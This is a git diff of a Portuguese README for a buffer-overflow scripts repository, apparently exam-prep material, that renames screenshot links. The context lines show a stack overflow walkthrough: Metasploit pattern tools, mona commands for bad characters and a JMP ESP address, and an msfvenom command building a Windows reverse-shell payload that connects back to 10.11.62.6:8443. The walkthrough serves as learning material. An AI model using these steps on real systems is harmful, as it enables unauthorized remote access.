@@ -59,12 +59,12 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
             
         2. Execução do Fuzzer
             
-            ![Untitled](BUffer%20Over%20Flow%20Preparation%20809085bfbf0a4f6e936a1ac27a85f18b/Untitled.png)
+            ![Debugger após a execução do Fuzzer](./images/Execucao-Fuzzer.png)
             
     2. Necessário um debbuger
         1. Image do estado do debugger após a execução do Fuzzer
             
-            ![Untitled](BUffer%20Over%20Flow%20Preparation%20809085bfbf0a4f6e936a1ac27a85f18b/Untitled%201.png)
+            ![Debugger Após a execução do Fuzzer](./images/Debugger-Depois-Fuzzing.png)
             
     3. Usar o pattern create e offset do metasploit
         1. Criar um padrão de caracteres que será enviado ao programa
@@ -74,7 +74,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
             msf-pattern_create -l 650
             ```
             
-            ![Untitled](BUffer%20Over%20Flow%20Preparation%20809085bfbf0a4f6e936a1ac27a85f18b/Untitled%202.png)
+            ![Criando padrão de caracteres](./images/Criando-Padrao-de-Caracteres.png)
             
             1. Após inserir o padrão criado no payload é necessário apenas enviar
                 
@@ -108,7 +108,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
                 
             2. Debugger após receber o payload
                 
-                ![Untitled](BUffer%20Over%20Flow%20Preparation%20809085bfbf0a4f6e936a1ac27a85f18b/Untitled%203.png)
+                ![Debugger após envio do payload (padrão de caracteres)](./images/Debugger-Depois-Payload.png)
                 
         2. Verificando após quantos caracteres é atingido o EIP
             1. com msf-pattern_offset
@@ -118,7 +118,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
                 msf-pattern_offset -l 650 -q 76413176
                 ```
                 
-                ![Untitled](BUffer%20Over%20Flow%20Preparation%20809085bfbf0a4f6e936a1ac27a85f18b/Untitled%204.png)
+                ![Verificando o offset the EIP via msf pattern offset](./images/Verificando-EIP-Offset.png)
                 
                 1. EIP começa a ser sobreescrito em 634
             2. Com o mona
@@ -130,7 +130,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
                 
                 1. Para saber o offset para encontrar a string *EIP contains normal pattern: …*
                     
-                    ![Untitled](BUffer%20Over%20Flow%20Preparation%20809085bfbf0a4f6e936a1ac27a85f18b/Untitled%205.png)
+                    ![Verificando o offset the EIP via msf pattern offset](./images/Verificando-EIP-Offset-Mona.png)
                     
             3. Após encontrar onde é o início do overflow do EIP basta adicionar essa informação no código
                 
@@ -158,14 +158,14 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
                 
             2. Um exemplo de como a pilha ficou após enviar o payload
                 
-                ![Untitled](BUffer%20Over%20Flow%20Preparation%20809085bfbf0a4f6e936a1ac27a85f18b/Untitled%206.png)
+                ![Estado da pilha após envio de BadChars](./images/Pilha-Apos-Envio-Badchars.png)
                 
         3. Agora é verificar o primeiro caractere que não se encontra na pilha do debugger
             1. Fazendo a mão
                 1. Aqui basta olhar a pilha ao clicar com o botão direito encima de ESP → Follow in Dump
                 2. Verificar qual o primeiro byte que não está correto na ordem
                     
-                    ![Untitled](BUffer%20Over%20Flow%20Preparation%20809085bfbf0a4f6e936a1ac27a85f18b/Untitled%207.png)
+                    ![Procurando o Primeiro BadChar](./images/Procurando-O-Primeiro-BadChar.png)
                     
             2. usando o mona
                 1. Configurando o mona → necessário executar apenas uma vez esse comando
@@ -188,7 +188,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
                     !mona compare -f C:\mona\oscp\bytearray.bin -a 0191FA30
                     ```
                     
-                    ![Untitled](BUffer%20Over%20Flow%20Preparation%20809085bfbf0a4f6e936a1ac27a85f18b/Untitled%208.png)
+                    ![Comparando Pilha com byte array](./images/Comparando-Pilha-Com-ByteArray.png)
                     
         4. Agora basta repetir o processo igual mencionado no ponto 4.iv acima
             1. Anotar o badchar encontrado, tirar o badchar descoberto do payload, reiniciar a aplicação e enviar o exploit novamente
@@ -204,7 +204,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
             !mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"
             ```
             
-            ![Untitled](BUffer%20Over%20Flow%20Preparation%20809085bfbf0a4f6e936a1ac27a85f18b/Untitled%209.png)
+            ![Untitled](./images/Resultados-Enderecos-Retorno-Mona.png)
             
         3. Escolher qualquer endereço de JMP mostrado
             
@@ -228,7 +228,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
             msfvenom -p windows/shell_reverse_tcp LHOST=10.11.62.6 LPORT=8443 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c
             ```
             
-            ![Untitled](BUffer%20Over%20Flow%20Preparation%20809085bfbf0a4f6e936a1ac27a85f18b/Untitled%2010.png)
+            ![Gerando Payload para Windows](./images/Gerando-Payload-Windows.png)
             
         2. Em seguida será apresentado uma saída do código em C, que é necessário adicionar na variável *payload* da seguinte forma:
             
@@ -359,7 +359,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
             
         2. Shell reversa recebida
             
-            ![Untitled](BUffer%20Over%20Flow%20Preparation%20809085bfbf0a4f6e936a1ac27a85f18b/Untitled%2011.png)
+            ![Recebendo Shell Reversa](./images/Recebendo-Shell-Reversa.png)
             
 
 - Exemplo do código final em cada etapa do processo
